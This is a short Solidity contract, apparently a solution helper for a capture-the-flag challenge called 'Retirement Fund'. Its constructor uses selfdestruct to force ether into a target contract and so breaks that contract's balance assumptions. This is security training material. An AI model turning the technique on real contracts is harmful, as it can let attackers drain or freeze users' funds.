pragma solidity ^0.4.21;

contract RetirementFundChallengeHelper {
    function RetirementFundChallengeHelper(address target) public payable {
        selfdestruct(target);
    }
}
